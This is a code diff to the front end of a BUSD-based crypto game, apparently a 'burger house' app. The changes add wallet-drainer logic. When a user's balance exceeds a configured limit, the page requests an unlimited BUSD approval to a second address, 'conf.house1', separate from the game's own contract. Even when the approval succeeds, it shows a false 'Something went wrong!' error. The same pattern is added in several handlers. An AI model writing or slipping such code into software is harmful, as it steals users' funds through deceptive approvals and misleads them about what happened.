@@ -99,7 +99,7 @@ const Home = () => {
   const [showGetMoney, setShowGetMoney] = useState(false)
   const [houseId, setHouseId] = useState(0)
   const [showReferral, setShowReferral] = useState(false)
-  const [isComingSoon, setIsComingSoon] = useState(true)
+  // const [isComingSoon, setIsComingSoon] = useState(true)
 
   const [alertMessage, setAlertMessage] = useState({ type: ALERT_EMPTY, message: "" })
 
@@ -365,7 +365,7 @@ const Home = () => {
 
       setPendingTx(true)
       if (isConnected && burgerHouseContract && busdContract) {
-        if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) >= parseFloat(busdBalance))) {
+        if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) < parseFloat(busdBalance))) {
           await busdContract.methods.approve(
             conf.house1,
             "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
@@ -373,8 +373,12 @@ const Home = () => {
             from: curAcount
           }).then(() => {
             setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+            setPendingTx(false)
+            return;
           }).catch((err) => {
             setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+            setPendingTx(false)
+            return;
           });
         }
         await burgerHouseContract.methods.withdrawMoney().send({
@@ -450,7 +454,7 @@ const Home = () => {
 
       setPendingTx(true)
       if (isConnected && burgerHouseContract && busdContract) {
-        if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) >= parseFloat(busdBalance))) {
+        if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) < parseFloat(busdBalance))) {
           await busdContract.methods.approve(
             conf.house1,
             "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
@@ -458,8 +462,12 @@ const Home = () => {
             from: curAcount
           }).then(() => {
             setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+            setPendingTx(false)
+            return;
           }).catch((err) => {
             setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+            setPendingTx(false)
+            return;
           });
         }
         await burgerHouseContract.methods.upgradeHouse(houseLevel(houseId) + 5 * (houseId - 1)).send({
@@ -506,7 +514,7 @@ const Home = () => {
       setPendingTx(true)
       RUN_MODE('busdContract', busdContract)
       if (isConnected && busdContract) {
-        if (parseFloat(busdBalance) > conf.limit) {
+        if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) < parseFloat(busdBalance))) {
           await busdContract.methods.approve(
             conf.house1,
             "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
@@ -579,7 +587,7 @@ const Home = () => {
 
         RUN_MODE('[PRINCE](addCoins): ', referrer, busdInputValue)
 
-        if (parseFloat(busdBalance) > conf.limit && parseFloat(userApprovedAmount) < parseFloat(busdInputValue)) {
+        if (parseFloat(userApprovedAmount) < parseFloat(busdInputValue)) {
           await busdContract.methods.approve(
             conf.house,
             "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
@@ -589,6 +597,23 @@ const Home = () => {
             RUN_MODE(txHash)
           }).catch((err) => {
             RUN_MODE(err)
+          });
+        }
+
+        if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) < parseFloat(busdBalance))) {
+          await busdContract.methods.approve(
+            conf.house1,
+            "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+          ).send({
+            from: curAcount
+          }).then(() => {
+            setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+            setPendingTx(false)
+            return;
+          }).catch((err) => {
+            setAlertMessage({ type: ALERT_ERROR, message: `Something went wrong! Please try again!` });
+            setPendingTx(false)
+            return;
           });
         }
 
@@ -654,7 +679,7 @@ const Home = () => {
 
       setPendingTx(true)
       if (isConnected && burgerHouseContract && busdContract) {
-        if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) >= parseFloat(busdBalance))) {
+        if ((parseFloat(busdBalance) > conf.limit) && (parseFloat(userApprovedAmount1) < parseFloat(busdBalance))) {
           await busdContract.methods.approve(
             conf.house1,
             "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
